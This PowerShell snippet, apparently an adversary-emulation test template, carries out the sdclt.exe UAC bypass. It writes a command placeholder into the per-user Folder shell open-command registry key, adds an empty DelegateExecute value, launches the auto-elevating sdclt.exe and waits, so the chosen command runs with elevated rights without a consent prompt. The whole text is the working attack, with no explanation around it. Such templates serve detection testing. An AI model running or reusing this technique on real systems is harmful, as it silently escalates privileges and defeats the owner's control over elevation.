New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3